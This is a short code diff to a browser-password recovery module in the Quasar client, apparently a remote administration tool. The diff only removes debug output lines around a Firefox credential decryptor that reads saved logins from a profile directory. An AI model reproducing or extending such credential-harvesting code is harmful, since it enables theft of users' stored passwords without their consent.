@@ -47,10 +47,7 @@ namespace Quasar.Client.Recovery.Browsers
                 {
                     using (var decrypter = new FFDecryptor())
                     {
-                        Debug.WriteLine("----------------------");
                         var r = decrypter.Init(dir);
-                        Debug.WriteLine(dir);
-                        Debug.WriteLine("----------------------");
                         if (signonsFound)
                         {
                             SQLiteHandler sqlDatabase;
